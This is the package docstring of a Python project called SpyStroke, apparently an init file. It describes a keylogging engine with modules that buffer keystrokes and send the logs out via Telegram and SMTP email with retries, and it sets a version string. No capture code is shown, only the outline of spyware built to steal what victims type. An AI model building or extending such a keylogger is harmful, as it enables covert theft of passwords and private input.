"""SpyStroke — shared keylogging engine and delivery reporters.

This package contains the reusable pieces used by both the Telegram and
email entry points:

* ``core``          — thread-safe keystroke buffering and key formatting
* ``config``        — environment-based configuration
* ``telegram_reporter`` — asynchronous Telegram log delivery with retries
* ``email_reporter``    — SMTP log delivery with retries
"""

__version__ = "2.0.0"
